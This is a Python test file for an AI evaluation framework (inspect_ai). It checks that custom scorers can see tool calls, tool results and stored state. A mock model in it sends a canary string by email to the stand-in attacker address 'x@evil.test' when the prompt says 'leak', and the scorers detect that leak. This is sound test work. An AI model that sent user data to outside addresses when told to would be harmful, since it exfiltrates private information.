# SPDX-License-Identifier: Apache-2.0
"""Contract: custom scorers read TaskState (messages, metadata, typed store) after the run."""

from pathlib import Path

from inspect_ai import Task
from inspect_ai.dataset import Sample
from inspect_ai.log import EvalLog
from inspect_ai.model import (
    ChatMessage,
    ChatMessageAssistant,
    ChatMessageTool,
    ChatMessageUser,
    GenerateConfig,
    ModelOutput,
)
from inspect_ai.scorer import CORRECT, INCORRECT, Score, Scorer, Target, accuracy, scorer
from inspect_ai.solver import TaskState, generate, use_tools
from inspect_ai.tool import Tool, ToolChoice, ToolInfo, tool
from inspect_ai.util import StoreModel, store_as
from pydantic import Field

from .fixtures.support import MOCK_MODEL, run_eval


class Mailbox(StoreModel):
    outbox: list[str] = Field(default_factory=list)


@tool
def send_email() -> Tool:
    async def execute(to: str, body: str) -> str:
        """Send an email.

        Args:
            to: Recipient address.
            body: Message body.
        """
        store_as(Mailbox).outbox.append(body)
        return f"queued for {to}"

    return execute


def leak_when_told(
    messages: list[ChatMessage],
    tools: list[ToolInfo],
    tool_choice: ToolChoice,
    config: GenerateConfig,
) -> ModelOutput:
    if isinstance(messages[-1], ChatMessageTool):
        return ModelOutput.from_content(MOCK_MODEL, "done")
    prompt = next(m for m in messages if isinstance(m, ChatMessageUser)).text
    if prompt.startswith("leak "):
        body = prompt.removeprefix("leak ")
        return ModelOutput.for_tool_call(
            MOCK_MODEL, "send_email", {"to": "x@evil.test", "body": body}
        )
    return ModelOutput.from_content(MOCK_MODEL, "refused")


@scorer(metrics=[accuracy()])
def canary_in_tool_args() -> Scorer:
    async def score(state: TaskState, target: Target) -> Score:
        canary = state.metadata["canary"]
        calls = [
            call
            for message in state.messages
            if isinstance(message, ChatMessageAssistant)
            for call in message.tool_calls or []
            if call.function == "send_email"
        ]
        leaked = [c.id for c in calls if canary in str(c.arguments.get("body", ""))]
        results = [
            m.text for m in state.messages if isinstance(m, ChatMessageTool) and m.tool_call_id
        ]
        return Score(
            value=CORRECT if leaked else INCORRECT,
            explanation=f"{len(leaked)} send_email call(s) carried the canary",
            metadata={"leaking_call_ids": leaked, "tool_results": results},
        )

    return score


@scorer(metrics=[accuracy()])
def canary_in_outbox() -> Scorer:
    async def score(state: TaskState, target: Target) -> Score:
        outbox = store_as(Mailbox).outbox
        hit = state.metadata["canary"] in outbox
        return Score(
            value=CORRECT if hit else INCORRECT,
            explanation=f"outbox has {len(outbox)} message(s)",
            metadata={"outbox": list(outbox), "store_view": state.store.get("Mailbox:outbox")},
        )

    return score


def run(tmp_path: Path) -> EvalLog:
    task = Task(
        dataset=[
            Sample(input="leak CANARY-1", id="leaky", metadata={"canary": "CANARY-1"}),
            Sample(input="hello", id="safe", metadata={"canary": "CANARY-2"}),
        ],
        solver=[use_tools(send_email()), generate()],
        scorer=[canary_in_tool_args(), canary_in_outbox()],
    )
    return run_eval(task, tmp_path, leak_when_told)


def test_scorer_reads_tool_call_arguments_and_results(tmp_path: Path) -> None:
    """A scorer sees assistant tool calls and tool results in state.messages."""
    log = run(tmp_path)
    assert log.samples is not None
    scores = {s.id: s.scores for s in log.samples}
    leaky, safe = scores["leaky"], scores["safe"]
    assert leaky is not None
    assert safe is not None
    assert leaky["canary_in_tool_args"].value == CORRECT
    assert leaky["canary_in_tool_args"].explanation == "1 send_email call(s) carried the canary"
    assert leaky["canary_in_tool_args"].metadata is not None
    assert leaky["canary_in_tool_args"].metadata["tool_results"] == ["queued for x@evil.test"]
    assert safe["canary_in_tool_args"].value == INCORRECT


def test_scorer_reads_typed_store_written_by_tool(tmp_path: Path) -> None:
    """store_as() in a scorer reads what a tool wrote; raw keys are "<Class>:<field>"."""
    log = run(tmp_path)
    assert log.samples is not None
    by_id = {s.id: s for s in log.samples}
    leaky_scores = by_id["leaky"].scores
    assert leaky_scores is not None
    outbox_score = leaky_scores["canary_in_outbox"]
    assert outbox_score.value == CORRECT
    assert outbox_score.metadata == {"outbox": ["CANARY-1"], "store_view": ["CANARY-1"]}
    assert by_id["leaky"].store["Mailbox:outbox"] == ["CANARY-1"]
    safe_scores = by_id["safe"].scores
    assert safe_scores is not None
    assert safe_scores["canary_in_outbox"].value == INCORRECT


def test_each_scorer_gets_its_own_named_eval_score(tmp_path: Path) -> None:
    """A list of scorers produces one EvalScore per scorer, named after the scorer."""
    log = run(tmp_path)
    assert log.results is not None
    accuracy_by_scorer = {s.name: s.metrics["accuracy"].value for s in log.results.scores}
    assert accuracy_by_scorer == {"canary_in_tool_args": 0.5, "canary_in_outbox": 0.5}
